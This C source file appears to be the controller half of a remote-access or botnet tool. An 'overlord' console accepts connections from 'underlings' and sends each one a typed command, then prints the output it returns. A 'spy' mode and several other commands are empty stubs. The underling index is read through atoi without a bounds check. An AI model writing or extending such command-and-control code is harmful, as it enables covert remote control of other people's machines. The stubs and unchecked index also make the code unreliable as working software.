#include "util.h"
#include "overlist.h"

#define MAX_INPUT 1024

#define EXIT 0
#define DEFAULT 1
#define ORDER 2
#define SPY 3
#define MANAGE 4

int main() {
  printf("Welcome, overlord.\n");
  printf("Type help for available commands.\n");

  int state = DEFAULT;
  char *input = NULL;
  char message[MAX_MESSAGE_LENGTH];
  client_list *underlings = newClientList();
  int sock = serverSocket(PORT);

	while (state) {
    switch (state) {
    case DEFAULT:
      prompt(&input, "[DEFAULT]> ", 1);

      if (startsWith(input, "help")) {
      
      } else if (startsWith(input, "order")) {
        state = ORDER;
      } else if (startsWith(input, "spy")) {
        state = SPY;
      } else if (startsWith(input, "manage")) {
        state = MANAGE;
      } else if (startsWith(input, "exit")) {
        state = EXIT;
      }

      break;

    case ORDER:
      if (underlings->size == 0) {
        printf("No underlings available.\n");
      } else {
        printClientList(underlings);

        prompt(&input, "Enter underling ID: ", 0);

        client_node *underling = underlings->list[atoi(input)];

        prompt(&input, "Enter command: ", 0);
        strncpy(message, input, MAX_MESSAGE_LENGTH);

        write(underling->sock, message, MAX_MESSAGE_LENGTH);

        read(underling->sock, message, MAX_MESSAGE_LENGTH);

        printf("%s\n", message);
      }
      
      state = DEFAULT;
      
      break;

    case SPY:

      break;

    case MANAGE:
      prompt(&input, "[MANAGE]> ", 1);

      if (startsWith(input, "add")) {
        printf("Waiting for underling to connect...\n");

        int connection = serverConnect(sock);

        printf("Underling connected.\n");

        prompt(&input, "Enter a description for this underling: ", 0);

        addClientToList(underlings, 0, connection, input);
      } else if (startsWith(input, "remove")) {

      } else if (startsWith(input, "view")) {
        printClientList(underlings);
      } else if (startsWith(input, "back")) {
        state = DEFAULT;
      }
            
      break;

    default:

      break;
    }
	}

  free(input);
  freeClientList(underlings);
  close(sock);
  
	return 0;
}
